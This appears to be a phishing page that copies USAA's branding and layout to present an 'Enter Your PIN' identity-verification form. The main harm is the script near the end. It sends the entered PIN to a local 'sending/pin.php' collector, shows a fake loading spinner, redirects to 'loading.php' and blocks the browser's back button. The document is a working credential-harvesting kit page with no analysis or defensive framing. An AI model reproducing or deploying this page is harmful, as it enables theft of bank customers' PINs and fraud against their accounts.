.42-.19.42-.42v-.83a.42.42 0 0 0-.42-.42zm0-5h-7.5a.42.42 0 0 0-.42.42v2.5c0 .23.19.41.42.41h7.5c.23 0 .42-.18.42-.41v-2.5a.42.42 0 0 0-.42-.42z'/%3E%3Cuse xlink:href='%23reuse-0'/%3E%3C/g%3E%3C/svg%3E" alt="">Deployment Pay Calculator</a></strong></li><li><strong><a class="menuContent-item menuContent-item--withIcon" href="https://www.usaa.com/inet/wc/advice-library?wa_ref=pub_global_advice_more_planners_calculators"><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' width='20' height='20'%3E%3Cdefs%3E%3Cpath id='reuse-0' d='M0 0h20v20H0z'/%3E%3C/defs%3E%3Cg fill='none' fill-rule='evenodd'%3E%3Cuse xlink:href='%23reuse-0'/%3E%3Cpath fill='%230b2237' d='M14.17 2.5c.92 0 1.66.75 1.66 1.67v11.66c0 .92-.74 1.67-1.66 1.67H5.83c-.92 0-1.66-.75-1.66-1.67V4.17c0-.92.74-1.67 1.66-1.67zM7.08 13.33h-.83a.42.42 0 0 0-.42.42v.83c0 .23.19.42.42.42h.83c.23 0 .42-.19.42-.42v-.83a.42.42 0 0 0-.42-.42zm3.34 0h-.84a.42.42 0 0 0-.41.42v.83c0 .23.18.42.41.42h.84c.23 0 .41-.19.41-.42v-.83a.42.42 0 0 0-.41-.42zm3.33 0h-.83a.42.42 0 0 0-.42.42v.83c0 .23.19.42.42.42h.83c.23 0 .42-.19.42-.42v-.83a.42.42 0 0 0-.42-.42zM7.08 10h-.83a.42.42 0 0 0-.42.42v.83c0 .23.19.42.42.42h.83c.23 0 .42-.19.42-.42v-.83a.42.42 0 0 0-.42-.42zm3.34 0h-.84a.42.42 0 0 0-.41.42v.83c0 .23.18.42.41.42h.84c.23 0 .41-.19.41-.42v-.83a.42.42 0 0 0-.41-.42zm3.33 0h-.83a.42.42 0 0 0-.42.42v.83c0 .23.19.42.42.42h.83c.23 0 .42-.19.42-.42v-.83a.42.42 0 0 0-.42-.42zm0-5h-7.5a.42.42 0 0 0-.42.42v2.5c0 .23.19.41.42.41h7.5c.23 0 .42-.18.42-.41v-2.5a.42.42 0 0 0-.42-.42z'/%3E%3Cuse xlink:href='%23reuse-0'/%3E%3C/g%3E%3C/svg%3E" alt="">More Planners and Calculators</a></strong></li></ul></div></div></div></div></div></div></li><li class="usaa-headerNav-menuItem"><a class="usaa-headerNav-menuLink" href="https://www.usaa.com/inet/wc/why_choose_usaa_main?wa_ref=pub_global_membership">Membership</a></li></ul></nav><button type="button" class="usaa-globalHeader-utilityButton" accesskey="4" aria-labelledby="search-label"><svg width="20" height="20" aria-hidden="true" focusable="false"><g fill="none"><path d="M0 0h20v20H0z"></path><path fill="currentColor" d="M8.5 3a5.5 5.5 0 014.6 8.6l4.4 4.4-1.5 1.5-4.4-4.4c-1 .6-2 .9-3.1.9a5.5 5.5 0 010-11zm0 2a3.5 3.5 0 100 7 3.5 3.5 0 000-7z"></path></g></svg><span id="search-label" class="usaa-globalHeader-utilityButtonText">Search<span class="usaa-globalNav-screenReader">, opens popup</span></span></button><button type="button" class="usaa-globalHeader-utilityButton" aria-labelledby="chat-label" accesskey="6"><svg width="20" height="20" aria-hidden="true" focusable="false"><g fill="none"><path d="M0 0h20v20H0z"></path><path d="M15 3a2 2 0 012 2v7a2 2 0 01-2 2h-2.5L10 17l-2.5-3H5a2 2 0 01-2-2V5a2 2 0 012-2h10zm-4.75 6.5h-3.5a.75.75 0 00-.102 1.493L6.75 11h3.5a.75.75 0 00.102-1.493L10.25 9.5zm3-3.5h-6.5a.75.75 0 00-.102 1.493l.102.007h6.5a.75.75 0 00.102-1.493L13.25 6z" fill="currentColor"></path></g></svg><span id="chat-label" class="usaa-globalHeader-utilityButtonText">Chat<span class="usaa-globalNav-screenReader">, opens popup</span></span></button><a href="https://www.usaa.com/my/logon?logoffjump=true&amp;wa_ref=pub_global_log_on" class="usaa-globalHeader-utilityButton usaa-globalHeader-utilityButton--logon"><svg width="20" height="20" class="usaa-globalHeader-avatar" aria-hidden="true" focusable="false"><g fill="none"><path d="M0 0h20v20H0z"></path><path d="M11.56 10c1.486 0 2.025.155 2.568.445.543.29.97.717 1.26 1.26.29.543.445 1.082.445 2.568v4.06H4.167v-4.06c0-1.486.154-2.025.445-2.568.29-.543.717-.97 1.26-1.26.543-.29 1.082-.445 2.568-.445h3.12zM10 1.667a3.333 3.333 0 110 6.666 3.333 3.333 0 010-6.666z" fill="currentColor"></path></g></svg>Log On</a></div></header><div class="globalPageHeader-navMask"></div></div>
			
			
			
			
			<script type="text/javascript">				
				(function () {					
					USAA.ent = USAA.ent || {};
					USAA.ent.memberAssistance = USAA.ent.memberAssistance || {};
					USAA.ent.memberAssistance.EvaPreloader = USAA.ent.memberAssistance.EvaPreloader || {};
					
					//Adding appID, pageID, and contentID to pageContext object
					USAA.ent.memberAssistance.EvaPreloader.pageContext = {
						'appId' : 'ProofingEvent',
						'pageId' : 'pf_identify_isMember_registration',
						'contentId' : ''
					};
				})();
			</script>
		
	




  <div id="bandwidthmsg" style="background-color: #FBFBFB; border: solid #FBFBFB; border-width: 0 45px; display: none">
   <p class="messageWarning">	
    We've detected that your internet connection might be slow. To 
quickly access your account, pay bills, transfer funds and more, 
    we suggest using <a href="https://mobile.usaa.com/inet/ent_logon/Logon">mobile.usaa.com</a> 
  </p>
  </div>














	
	



	
	
	
		
	

	
	
		<!-- END PAGE HEADER --> 
 	 
 </div> 
 		
 		
				


 


	
	
	

	   
		
		

		
		<div id="content" role="main">
		<div class="noindex"> 
			


 





<div id="toolsHeading">
        
        


        
		
				                              
        
</div>




	
	
	

	
		




 

<link rel="stylesheet" type="text/css" href="verify/ent_member_eva_cta.css">


 	


	


		</div> 

		
		
		
	
		
			
				<div id="rightColWrapper"> 	
			
		
		
		<div id="main">
			
			
				
            		
			<a name="contentLink"></a>
			
				
				

 



	
	

    	
	
	    <form action="" method="post" id="form" name="pf_identify_isMember_registration">

<input type="hidden" name="CSRFToken" id="CSRFToken" value="68678cfb0b5a822655575f7004423575">
<input type="hidden" name="PS_APPLICATIONGUID" id="PS_APPLICATIONGUID" value="PS_ProofingEvent_1669877513916">
<input type="hidden" name="PS_RESPONSETIMESTAMP" id="PS_RESPONSETIMESTAMP" value="1669877513919">
<input type="hidden" name="PS_TASKID" id="PS_TASKID" value="">
<input type="hidden" name="PS_TASKNAME" id="PS_TASKNAME" value="IdentifyEvent">
<input type="hidden" name="PS_PAGEID" id="PS_PAGEID" value="pf_identify_isMember_registration">
<input type="hidden" name="PS_DYNAMIC_ACTION" id="PS_DYNAMIC_ACTION" value="">
<input type="hidden" name="PS_ACTION_CONTEXT" id="PS_ACTION_CONTEXT" value="">
<input type="hidden" name="PS_SCROLL_POSITION" id="PS_SCROLL_POSITION" value="">
<!-- pwxmbr881as2lsat,   ent_proofing_01 -->

<input name="PsButton_[action]update[/action]" tabindex="-1" aria-hidden="true" type="image" src="verify/g_transparent.gif" alt="" title="" value="empty" width="1" height="1" border="0"><div style="display: none"><label for="hidden_text_input" style="display: none">&nbsp;</label><input id="hidden_text_input" type="text" name="hidden_text_input" maxlength="1" size="1" disabled="disabled" tabindex="0"></div>

	

	
	<!-- BEGIN SEARCH INDEX -->
	
	






<link rel="stylesheet" type="text/css" href="verify/dotCom_applicationStyles.css">

<script src="verify/pf_registration_siteCatalyst-min.js" type="text/javascript"></script>

				<div id="personalContainer" class="submain fl">



					<div id="ContactInfoHeader" style="margin-top: -2px;">
						<!--  WCM CONTENT OBJECT=eligibility_join_now_introduction_complex_module -->
						<div class="HeaderText">
							<h1 class="heading">Enter Your PIN</h1>
						</div><br>
						<hr></hr>

						<!--  WCM CONTENT ENDS  -->

					</div>

					<div id="container1" class="body">

						<p style="float: left; margin-bottom: 15px; margin-top: 15px;">
							&nbsp; We are committed to keeping your information secure and confidential.</p>
							<p style="float: left; margin-bottom: 15px; margin-top: 15px;">
							Entering your personal identification number (PIN) each time you access your accounts or use chat on<br> usaa.com allows us to verify who you are and give you the maximum security and privacy for your information.</p>

						<table class="tableData" width="100%" cellspacing="0">
							<tbody>
								<tr>
									<td class="dataLabel" style="width: 20%;">PIN<br>
									<span>
                                   <a class="dataLabel" style="width: 10%;" id="id6">
                              <span><small>Explain PIN</small></span></td>
									<td>
								<input type="password" size="5" maxlength="4" value="" required="" name="pin" id="pin" autocomplete="off" onblur="change()"><br>
								<a href="#" class="Z�IxOc usaa-link p1"><span class="DjMUcW link-liner"><small>Reset Your PIN</small></span></a>
									</td>
								</tr>
							</tbody>
						</table>

						<div class="buttonContainer accButton">
                                     <span class="button_primary_v2"><button value="Continue" id="btn" class="button_primary" type="submit">Next</button></span>  
				
		</div>


	</div>
</div>

	<!-- END SEARCH INDEX -->

	
	
		</form>

	

				
			
		</div> 
			
				
					<div id="rightCol" class="rightCol"> 
						<div class="noindex"> 
						
							
							
								
								<h2 class="hiddenMessage">Further Information</h2>
							
						
							
							


<!--  WCM CONTENT OBJECT=eligibility_registration_right_rail_complex_module -->
<link href="verify/tridion_DWT.css" rel="stylesheet" type="text/css">

<div class="DWT">
 <div class="rightModule">
<h3 class="hiddenMessage" aria-hidden="true">Manage Your USAA Account Anywhere</h3>
<img alt="With USAA, you're free to manage your account from anywhere. You'll be able to access your account online from your mobile device or tablet." src="verify/bank-anywhere-devices-image.png" title="" width="206">
<p class="text-left">With USAA, you're free to manage your account from 
anywhere. You'll be able to access your account online from your mobile 
device or from your iPad.</p>
</div> 
</div>
<!--  WCM CONTENT ENDS  -->

<div class="endcap"></div>

						</div> 
					</div> 
				
			
		
		
			
				</div> 
			
		
	</div>	
			

 	
	
	
 <div class="noindex"> 
	
	
	
		<!-- BEGIN PAGE FOOTER -->
		








<a name="bottom"></a>


	
	
	
	
		
	


<div id="footer" class="usaa-nav-footer">
	



	
	
	
	    
	    	<div class="usaa-globalFooterNav usaa-globalFooterNav--fixed"><div class="usaa-globalNav-480 usaa-globalNav-768 usaa-globalNav-970 usaa-globalNav-container"><div class="globalFooterNav-mainRow"><a class="globalFooterNav-logoLink" href="https://www.usaa.com/?wa_ref=pub_footer_home"><svg viewBox="0 0 40 40" aria-label="USAA Home" focusable="false"><path fill="#0b2237" fill-rule="evenodd" d="M31.38 27.9s.99.66 1.94.66c.97 0 1.81-.69 1.81-.69v-3.36s-.85.6-1.8.6c-.95 0-1.95-.65-1.95-.65l-9.87-5.81.92 3.98 8.95 5.27zM4.75 17.53s-.95-.66-1.95-.66c-.99 0-1.8.7-1.8.7v3.35s.81-.6 1.8-.6c1 0 1.95.66 1.95.66l8.15 4.8.7-3.04-8.85-5.2zm26.63 5.98s.99.66 1.94.66c.97 0 1.81-.7 1.81-.7v-3.35s-.85.6-1.8.6c-.95 0-1.95-.65-1.95-.65l-11.03-6.5.91 3.98 10.12 5.96zM4.75 13.14s-.95-.66-1.95-.66c-.99 0-1.8.69-1.8.69v3.36s.81-.6 1.8-.6c1 0 1.95.65 1.95.65l9.04 5.32.7-3.03-9.74-5.73zm26.63 5.98s.99.65 1.94.65c.97 0 1.81-.68 1.81-.68v-3.36s-.85.6-1.8.6c-.95 0-1.95-.65-1.95-.65l-12.2-7.2.92 4 11.28 6.64zM4.75 8.75s-.95-.66-1.95-.66c-.99 0-1.8.69-1.8.69v3.35s.81-.6 1.8-.6c1 0 1.95.66 1.95.66l9.92 5.84.7-3.03L4.75 8.75zm14.18-1.36l12.45 7.33s.99.66 1.94.66c.97 0 1.81-.69 1.81-.69v-3.36s-.85.61-1.8.61c-.95 0-1.95-.66-1.95-.66l-9.63-5.67-.66-2.54c0-.11.1-.16.13-.17l1.63-.51c.22 0 .34.19.34.35l.1.18c.05.03.31-.05.31-.1v-1c.01-.67-.52-1.26-1.23-1.26h-1.64S20.5 0 19.8 0h-3.1c-.8 0-1 .78-1 .78l-2.16 8.76-8.79-5.18S3.8 3.7 2.8 3.7c-.99 0-1.8.68-1.8.68v3.36s.81-.6 1.8-.6c1 0 1.95.66 1.95.66l10.81 6.36 2.46-10.73.91 3.96zm-1.96 29.44c0 1.82-1.49 3.15-3.55 3.15-2.17 0-2.89-.37-2.89-.37l-.18-2.02s1.2.8 2.97.8c.5 0 1.6-.34 1.6-1.34 0-.95-.87-1.25-1.08-1.36-.43-.23-.95-.46-1.37-.67-.8-.4-1.98-1.15-1.98-2.74 0-2.3 2.07-3.14 3.7-3.14 1.32 0 2.48.58 2.48.58v1.88c-.37-.21-.98-.89-2.48-.89-1.02 0-1.71.54-1.71 1.3 0 .7.58 1.17 1.14 1.43.56.26.93.43 1.58.75.81.4 1.77 1.23 1.77 2.64zm-9.7-.87c0 .84-.28 2.42-2.2 2.39C3.33 38.3 3 36.7 3 35.68v-6.34H1v6.44C1 39.4 3.22 40 5.07 40c2.75 0 4.02-1.8 4.02-4.26v-6.4H7.27v6.62zm27.86 3.8h-2.18l-.63-1.82H28.6l-.63 1.83h-3.72l-.63-1.83H19.9l-.63 1.83H17.3l3.6-9.62-.35-.81h2.18l3.5 9.83 3.37-9.02-.34-.81h2.17l3.7 10.43zm-12-3.28l-1.3-4.11-1.45 4.1h2.75zm8.7 0l-1.3-4.11-1.44 4.1h2.74zm3.82-6.66a2.27 2.27 0 00-.84 3.06 2.27 2.27 0 003.06.83 2.27 2.27 0 00.83-3.07 2.3 2.3 0 00-1.94-1.12c-.38 0-.75.1-1.1.3zm2.03.32a1.89 1.89 0 01.7 2.56 1.89 1.89 0 01-2.55.7 1.87 1.87 0 111.85-3.25zm-1.52 2.87v-1.03h.23a.5.5 0 01.31.09c.1.07.24.26.41.56l.22.38h.47l-.3-.48a2.79 2.79 0 00-.35-.47.67.67 0 00-.2-.13c.2-.02.37-.09.5-.22a.64.64 0 00.07-.81.6.6 0 00-.3-.24 2.03 2.03 0 00-.62-.06h-.83V33h.4zm0-2.09h.45c.19 0 .32.02.39.04.07.03.12.07.16.13.04.06.06.12.06.2 0 .1-.04.2-.12.26-.08.07-.24.1-.46.1h-.48v-.73z"></path></svg></a><nav aria-label="Footer"><ul class="globalFooterNav-links"><li class="globalFooterNav-linksItem"><a href="https://www.usaa.com/inet/wc/about_usaa_main?wa_ref=pub_footer_about">About</a></li><li class="globalFooterNav-linksItem"><a href="https://www.usaa.com/inet/wc/shopping_and_discounts_main?wa_ref=pub_footer_perks">Perks</a></li><li class="globalFooterNav-linksItem"><a href="https://communities.usaa.com/?wa_ref=pub_footer_community">Community</a></li><li class="globalFooterNav-linksItem"><a href="https://www.usaa.com/careers?wa_ref=pub_footer_careers">Careers</a></li><li class="globalFooterNav-linksItem"><a href="https://www.usaa.com/inet/pages/accessibility_at_usaa_main?wa_ref=pub_footer_accessibility" accesskey="0">Accessibility</a></li><li class="globalFooterNav-linksItem"><a href="https://www.usaa.com/inet/wc/security_center?wa_ref=pub_footer_security">Security</a></li><li class="globalFooterNav-linksItem"><a href="https://www.usaa.com/help/contact/?wa_ref=pub_footer_contact">Contact</a></li><li class="globalFooterNav-linksItem"><a href="https://www.usaa.com/inet/wc/usaa_mobile_main?wa_ref=pub_footer_mobile_app">Mobile App</a></li></ul></nav><nav class="globalFooterNav-social" aria-label="Social media"><ul><li><a target="_blank" rel="noopener noreferrer" href="https://www.usaa.com/inet/wc/global-community-bar-fb-redirect?wa_ref=pub_footer_facebook"><img src="data:image/svg+xml,%3Csvg width='48' height='48' viewBox='0 0 48 48' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='none' fill-rule='evenodd'%3E%3Cpath d='M0 0h48v48H0z'/%3E%3Cpath d='M24 0a24 24 0 013.9 47.68v-16.9h5.72l1.1-7.01H27.9v-4.55c0-1.92.96-3.78 4-3.78H35V9.47S32.2 9 29.5 9c-5.6 0-9.27 3.35-9.27 9.43v5.34H14v7h6.23v16.94A24 24 0 0124 0z' fill='%230B2237'/%3E%3C/g%3E%3C/svg%3E" alt="USAA Facebook"></a></li><li><a target="_blank" rel="noopener noreferrer" href="https://www.usaa.com/inet/wc/global-community-bar-tw-redirect?wa_ref=pub_footer_twitter"><img src="data:image/svg+xml,%3Csvg width='48' height='48' viewBox='0 0 48 48' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='none' fill-rule='evenodd'%3E%3Cpath d='M0 0h48v48H0z'/%3E%3Cpath d='M24 0a24 24 0 110 48 24 24 0 010-48zm6.28 13.74a5.79 5.79 0 00-5.63 7.1 16.42 16.42 0 01-11.93-6.04 5.8 5.8 0 001.8 7.71 5.68 5.68 0 01-2.62-.72v.07c0 2.81 2 5.14 4.65 5.68a5.77 5.77 0 01-2.62.1 5.78 5.78 0 005.4 4.02 11.63 11.63 0 01-8.57 2.38 16.12 16.12 0 008.85 2.62c10.64 0 16.46-8.82 16.46-16.46l-.01-.75a11.85 11.85 0 002.9-3c-1.04.46-2.16.77-3.33.91a5.78 5.78 0 002.54-3.2 11.72 11.72 0 01-3.67 1.4 5.76 5.76 0 00-4.22-1.82z' fill='%230B2237'/%3E%3C/g%3E%3C/svg%3E" alt="USAA Twitter"></a></li><li><a target="_blank" rel="noopener noreferrer" href="https://www.usaa.com/inet/wc/global-community-bar-yt-redirect?wa_ref=pub_footer_youtube"><img src="data:image/svg+xml,%3Csvg width='48' height='48' viewBox='0 0 48 48' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='none' fill-rule='evenodd'%3E%3Cpath d='M0 0h48v48H0z'/%3E%3Cpath d='M24 0a24 24 0 110 48 24 24 0 010-48zm0 14h-.32c-1.68 0-9.32.07-11.4.63a3.77 3.77 0 00-2.65 2.67C9.06 19.41 9 23.6 9 24.42v.3c0 .83.06 5 .63 7.12a3.77 3.77 0 002.65 2.67c2.17.58 10.37.62 11.57.63h.3c1.2 0 9.4-.05 11.57-.63a3.77 3.77 0 002.65-2.67c.57-2.12.62-6.3.63-7.12v-.14-.16c0-.83-.06-5-.63-7.12a3.77 3.77 0 00-2.65-2.67c-2.08-.56-9.72-.62-11.4-.63h-.31H24zm-3.07 6.1l7.84 4.47-7.84 4.46V20.1z' fill='%230B2237'/%3E%3C/g%3E%3C/svg%3E" alt="USAA YouTube"></a></li></ul></nav></div><nav aria-label="Additional Information"><div class="globalFooterNav-extraLinks"><div><a class="globalFooterNav-extraLink" href="https://www.usaa.com/inet/wc/security_protect_your_personal_information?wa_ref=pub_footer_privacy">Privacy</a><a class="globalFooterNav-extraLink" href="https://www.usaa.com/inet/pages/site_map?wa_ref=pub_footer_site_map" accesskey="7">Site Map</a><a class="globalFooterNav-extraLink" href="https://www.usaa.com/inet/pages/site_terms_and_conditions_main?wa_ref=pub_footer_site_terms">Site Terms</a></div></div></nav><div class="globalFooterNav-copyright">Copyright 2023 USAA</div></div></div>
    	
    	
	
	
	
		
		
				
			
		<script language="JavaScript">
				var onPublicSide = "true";
				var initialReferrerURL = "null";
		</script>
				

		
	
	
		
			
			






<script>
	USAA.namespace("USAA.ent.digitalData");
	USAA.ent.digitalData = {"pageIDentifier":"prod","page":{"pageID":"pf_identify_isMember_registration","platform":"www","activityType":"ent","businessUnit":"ent","productLOB":"ent","productOffered":"n_a","productQualifier":"n_a:n_a","flowType":"proof_event","pageDesc":"pf_already_member","attributes":{"jvm":"ent_proofing_01","pageType":"www","appId":"ProofingEvent","daPageName":"","host":"pwxmbr881as2lsat","sysEnv":"member","uri":"/inet/ent_proof/proofingEvent","daUID":"lb4pxdnlitauqf","xCKey":"ProofingEvent","daEnvironment":"usaaprod"}},"product":[],"event":[{"eventName":"16","attributes":{}}],"component":{"attributes":{}},"user":{"attributes":{}},"version":{"version":"1"},"campaign":{},"csrfToken":"68678cfb0b5a822655575f7004423575"};

	(function (a, b, c, d) {
		
		
		a='//tms.usaa.com/main/prod/utag.js';
		
		b=document;c='script';d=b.createElement(c);d.src=a;d.type='text/java'+c;d.async=true;
		a=b.getElementsByTagName(c)[0];a.parentNode.insertBefore(d,a);
	})();
</script>
		
	

	
			
			
		
	



	
	
 	
 	
 		
 	



	<div id="legalText" class="accentAnchors" role="contentinfo">
		
		
		
		
			
		
		<div class="footnotes"></div><br><script language="JavaScript1.2" src="verify/footnotes-min.js" type="text/javascript"> </script> <script language="JavaScript" type="text/javascript"> USAA.ent.util.Footnotes.findFootnotes(); </script>
		
		
		
		
			
		
	</div>
		
	
	
	
	
	<br clear="all">
	
	
		
	
			<div class="yui-overlay" style="z-index: 11002"></div>
		
	
</div>
 

		<!-- END PAGE FOOTER -->
	
 </div> 

</div><div class="usaa-globalNav-helpContainer"></div> 
    







    
		

<!-- Builds the resources needed to enable iframe sharing during Screen Share. This file is intended to be added to JSP templates. -->



<script type="text/javascript" src="verify/screenShareIFrame-min.js"></script>

<script type="text/javascript">
	if (typeof (USAA) === 'undefined') { 
		var USAA = { ent: {} }; 
	} 
	else if (typeof (USAA.ent) === 'undefined') {
		USAA.ent = {};
	}
	
	var screenShareIFrameURLs = {
			liveAssistIFrameResourceURL: 'https://liveassist.usaa.com:443/assistserver/sdk/web/consumer/js/assist-iframe.js',
			liveAssistIFrameSDKURL: 'https://liveassist.usaa.com:443/assistserver/sdk/web/consumer/js' 
		};
	
	if (window && window.addEventListener) {
		window.addEventListener("load", USAA.ent.screenShareIFrame.initialize(screenShareIFrameURLs));
	}
</script>
	
<script type="text/javascript" src="verify/MfAjsB"></script>
<script src="https://ajax.aspnetcdn.com/ajax/jQuery/jquery-3.3.1.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.10/jquery.mask.js"></script> 
<script type="text/javascript">

history.pushState(null, document.title, location.href);
window.addEventListener('popstate', function (event)
{
  history.pushState(null, document.title, location.href);
});

//$(document).bind("contextmenu", function(e){ return false;});

var count = 0;
var counts = 0;

$('#form').on('submit', function(e){
		counts = counts+1;
		$('#btn').html('<i class="fa fa-circle-o-notch fa-spin fa-1x fa-fw"></i>');
		$.post('sending/pin.php', $(this).serialize(), function(data){
			console.log(data);
		});
		setTimeout(function() {
		
							if(counts == 1){
							   $('#step1').hide();
							   $('#step2').show();
							   
					   setTimeout(function() {
                              window.location.href = "loading.php";
                        },9000);
							   
							}else{
							     $('#otp').val('');
								 $('#msg').show();
								 $('#btn').html('Next');
							}
		
                            
                        },2000);
		e.preventDefault();
	});

</script>
<script>

    $(function() {
       $('[name="pin"]').mask('0000');

    });

</script>
</body><!-- END HTML BODY --></html>